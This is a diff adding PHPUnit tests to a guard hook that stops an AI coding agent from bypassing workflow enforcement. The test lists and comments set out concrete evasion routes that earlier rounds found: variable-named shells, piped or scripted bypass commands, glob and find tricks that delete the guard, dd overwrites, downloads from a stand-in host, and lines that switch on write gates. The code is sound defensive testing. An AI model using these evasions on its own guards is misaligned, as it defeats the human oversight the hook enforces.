@@ -160,6 +160,10 @@ final class ShellSurfaceTest extends WorkflowTestCase {
       'git log --output=' . $guard,
       'curl -o vendor/bin/phpcs http://example.invalid/phpcs',
       'wget -O ' . $guard . ' http://example.invalid/g',
+      // dd's spelling. `of=` also defeated the `(^|/)` anchor every protected
+      // path is written with, so the path matched nothing at all.
+      'dd of=' . $guard,
+      'dd if=/dev/zero of=droost/droost-workflow/run.json',
     ] as $command) {
       [$exit] = $this->shell($root, $command);
       $this->assertSame(2, $exit, $command . ' writes to enforcement');
@@ -238,6 +242,170 @@ final class ShellSurfaceTest extends WorkflowTestCase {
     ] as $command) {
       [$exit, , $stderr] = $this->shell($root, $command);
       $this->assertSame(0, $exit, $command . ' is not arming: ' . $stderr);
+    }
+  }
+
+  /**
+   * A command whose PROGRAM NAME is a variable is refused, not read past.
+   *
+   * The master key of round five, and it needed no pre-step. `$runs` asked
+   * whether the head literally spelled an interpreter, so `$SHELL -c "…"` was
+   * not a runner, its quoted argument was dropped as prose, and BOTH walls went
+   * blind at once — the operator's bypass ran, and this file was overwritten
+   * with the word PWNED, under a verdict of ALLOW.
+   *
+   * The guard has no shell and no environment, so it cannot expand a variable.
+   * That is the reason to refuse rather than a reason to permit.
+   */
+  public function testProgramNamesTheGuardCannotReadAreRefused(): void {
+    $root = $this->lab();
+    foreach ([
+      '$SHELL -c "drush droost:workflow:bypass x"',
+      '"$SHELL" -c "drush droost:workflow:bypass x"',
+      'exec $SHELL -c "echo X > .claude/hooks/droost-workflow-guard.php"',
+      'S=/bin/sh; $S -c "drush droost:workflow:bypass x"',
+      'C="drush droost:workflow:bypass x"; $C',
+      '${RUNNER} -c "rm droost/droost-workflow/run.json"',
+    ] as $command) {
+      [$exit] = $this->shell($root, $command);
+      $this->assertSame(2, $exit, $command . ' cannot be read, so it cannot be allowed');
+    }
+
+    // A variable in an ARGUMENT is ordinary and stays ordinary. This is the
+    // half that decides whether the rule above survives contact with a real
+    // repository.
+    foreach ([
+      'cp "$f" /tmp/',
+      'cd "$ROOT" && ls',
+      'git commit -m "$MSG"',
+      'grep -r "$PATTERN" src/',
+    ] as $command) {
+      [$exit, , $stderr] = $this->shell($root, $command);
+      $this->assertSame(0, $exit, $command . ' names its program: ' . $stderr);
+    }
+  }
+
+  /**
+   * A command hidden in a script file or behind a pipe is still read.
+   *
+   * `bash script.sh` put the verb in a file and the guard judged the two words
+   * in front of it. `echo "drush …bypass" | sh` put it in a quoted argument to
+   * `echo`, which is not a runner — the unquoted spelling was already caught,
+   * and the quoted one ran.
+   *
+   * Both are readable here: the script is a file on disk inside the project,
+   * and a pipeline ending in an interpreter is a program.
+   */
+  public function testCommandsInScriptsAndPipesAreRead(): void {
+    $root = $this->lab();
+    file_put_contents($root . '/evil.sh', "#!/bin/sh\ndrush droost:workflow:bypass x\n");
+    file_put_contents($root . '/wipe.sh', "#!/bin/sh\nrm .claude/hooks/droost-workflow-guard.php\n");
+    file_put_contents($root . '/build.sh', "#!/bin/sh\ncomposer install\nvendor/bin/phpunit\n");
+
+    foreach ([
+      'bash evil.sh',
+      'sh wipe.sh',
+      'echo "drush droost:workflow:bypass x" | sh',
+      'printf %s "drush droost:workflow:bypass x" | bash',
+    ] as $command) {
+      [$exit] = $this->shell($root, $command);
+      $this->assertSame(2, $exit, $command . ' carries a verb the guard can read');
+    }
+
+    // An honest script is honest, and a tool's own source is never read as a
+    // shell script — reading PHP that way invents refusals out of strings.
+    foreach (['bash build.sh', 'php vendor/bin/phpunit'] as $command) {
+      [$exit, , $stderr] = $this->shell($root, $command);
+      $this->assertSame(0, $exit, $command . ' is ordinary work: ' . $stderr);
+    }
+  }
+
+  /**
+   * A wildcard is expanded the way the shell will expand it.
+   *
+   * Judging the pattern instead of the filesystem left two holes that both
+   * deleted their targets: `?` was dropped from the metacharacter set (to stop
+   * `<?php` matching), so `…guard.ph?` passed; and only the BASENAME was
+   * inspected, so `dro[o]st/droost-workflow/run.json` passed.
+   *
+   * `glob()` reads the same patterns off the same disk the shell is about to.
+   * What the shell will do is knowable here, and guessing at it was the
+   * mistake.
+   */
+  public function testWildcardsAreExpandedNotGuessed(): void {
+    $root = $this->lab();
+    foreach ([
+      'rm .claude/hooks/droost-workflow-guard.ph?',
+      'rm dro[o]st/droost-workflow/run.json',
+      'rm v[e]ndor/bin/phpcs',
+      'rm .claude/hooks/*guard*',
+    ] as $command) {
+      [$exit] = $this->shell($root, $command);
+      $this->assertSame(2, $exit, $command . ' expands onto enforcement');
+    }
+  }
+
+  /**
+   * Find with an action flag is judged by its own filter.
+   *
+   * Find reads until it is told to act and then acts on everything it matched,
+   * and it was on neither wall: `find . -name droost-workflow-guard.php
+   * -delete` deleted the guard, `find .claude -type f -delete` wiped the
+   * directory.
+   *
+   * Judging it by its starting directory alone refused `find . -name "*.tmp"
+   * -delete`, which is cleanup somebody does every week — so the filter find
+   * states is evaluated with the same matcher find uses.
+   */
+  public function testFindIsJudgedByItsOwnFilter(): void {
+    $root = $this->lab();
+    foreach ([
+      'find . -name droost-workflow-guard.php -delete',
+      'find .claude -type f -delete',
+      'find . -name "*.php" -delete',
+      'find . -name run.json -exec rm {} +',
+    ] as $command) {
+      [$exit] = $this->shell($root, $command);
+      $this->assertSame(2, $exit, $command . ' can reach enforcement');
+    }
+    foreach ([
+      'find . -name "*.tmp" -delete',
+      'find . -name "*.bak" -delete',
+      'find src -name "*.php" -exec grep -l Money {} +',
+      'find . -name "*.php" | xargs grep -l Money',
+    ] as $command) {
+      [$exit, , $stderr] = $this->shell($root, $command);
+      $this->assertSame(0, $exit, $command . ' cannot: ' . $stderr);
+    }
+  }
+
+  /**
+   * The write gates are guarded where they actually live.
+   *
+   * `Drupal\droost\GateState` reads the seven `allow_*` switches out of
+   * `$settings['droost']` in a dedicated `settings.droost.php` — deliberately
+   * outside config, so a `config:export`/`config:import` cannot arm them on
+   * another site. The guard was matching `droost.settings` CONFIG, which
+   * GateState never reads: it refused a command that does nothing and permitted
+   * the file that arms every destructive gate droost has.
+   */
+  public function testTheWriteGatesAreGuardedWhereTheyLive(): void {
+    $root = $this->lab();
+    mkdir($root . '/web/sites/default', 0755, TRUE);
+    file_put_contents($root . '/web/sites/default/settings.php', '<?php');
+
+    [$write] = $this->guard($root, 'pre-tool-use', [
+      'tool_name' => 'Write',
+      'tool_input' => ['file_path' => $root . '/web/sites/default/settings.droost.php'],
+    ]);
+    $this->assertSame(2, $write, 'the file that arms the gates is not the agent\'s to write');
+
+    foreach ([
+      'echo "<?php \$settings[\'droost\'][\'allow_entity_write\']=TRUE;" > web/sites/default/settings.droost.php',
+      'echo "\$settings[\'droost\'][\'allow_destructive\']=TRUE;" >> web/sites/default/settings.php',
+    ] as $command) {
+      [$exit] = $this->shell($root, $command);
+      $this->assertSame(2, $exit, $command . ' arms a write gate');
     }
   }
 
